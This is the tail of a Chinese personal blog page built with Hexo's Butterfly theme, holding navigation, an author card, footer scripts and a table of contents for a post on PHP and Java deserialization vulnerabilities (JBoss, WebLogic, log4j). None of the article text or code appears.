data-image="https://jhyyj.oss-cn-qingdao.aliyuncs.com/blog/touxiang.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/12/10/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2024/12/10/XSS/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jhyyj.oss-cn-qingdao.aliyuncs.com/blog/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">江湖有缘见</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fa-brands fa-weixin" style="color: #24292e;"></i></a><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fa-brands fa-qq" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%92%8Cjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">php和java反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%8Cphp%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">1，php的序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88serialize%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">序列化（serialize）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88unserialize%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列化（unserialize）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">PHP序列化和反序列化的两个函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">反序列化漏洞产生的原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">php中常见的魔法函数：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%EF%BC%8CJava%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">2，Java序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%8C%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88ObjectOutputStream%E7%B1%BB%E7%9A%84writeObject%EF%BC%89"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">1，序列化（ObjectOutputStream类的writeObject）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88ObjectInputStream%E7%B1%BB%E7%9A%84readObject%EF%BC%89"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">2，反序列化（ObjectInputStream类的readObject）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%8CObjectOutputStream-%E4%B8%8E-ObjectInputStream%E7%B1%BB%EF%BC%8C%E8%AF%B4%E6%98%8E"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">3，ObjectOutputStream 与 ObjectInputStream类，说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%A6%81%E6%B1%82"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">4，实现序列化的要求</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%8C%E5%BD%A2%E6%88%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A0%B9%E6%BA%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">5，形成漏洞的根源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">中间件反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jboss"><span class="toc-number">1.3.1.</span> <span class="toc-text">jboss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%8Cjboss%E5%8E%86%E5%8F%B2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%BC%96%E5%8F%B7"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1，jboss历史反序列化漏洞及编号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1%EF%BC%8CCVE-2017-12149-jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">1.1，CVE-2017-12149 jboss反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2%EF%BC%8CCVE-2017-7504-jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">1.2，CVE-2017-7504 jboss反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3%EF%BC%8CJMXInvokerServlet-jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">1.3，JMXInvokerServlet jboss反序列化漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic"><span class="toc-number">1.4.</span> <span class="toc-text">Weblogic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-log4j"><span class="toc-number">1.5.</span> <span class="toc-text">apache log4j</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title="无题">无题</a><time datetime="2024-12-10T10:52:01.860Z" title="发表于 2024-12-10 18:52:01">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="无题">无题</a><time datetime="2024-12-10T10:52:01.859Z" title="发表于 2024-12-10 18:52:01">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/XSS/" title="无题">无题</a><time datetime="2024-12-10T10:52:01.858Z" title="发表于 2024-12-10 18:52:01">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/web%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" title="无题">无题</a><time datetime="2024-12-10T10:52:01.857Z" title="发表于 2024-12-10 18:52:01">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/sql%E6%B3%A8%E5%85%A5/" title="无题">无题</a><time datetime="2024-12-10T10:52:01.856Z" title="发表于 2024-12-10 18:52:01">2024-12-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 江湖有缘见</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch@4.22.1/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@4.65.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js?v=4.13.0"></script></div></div></body></html>
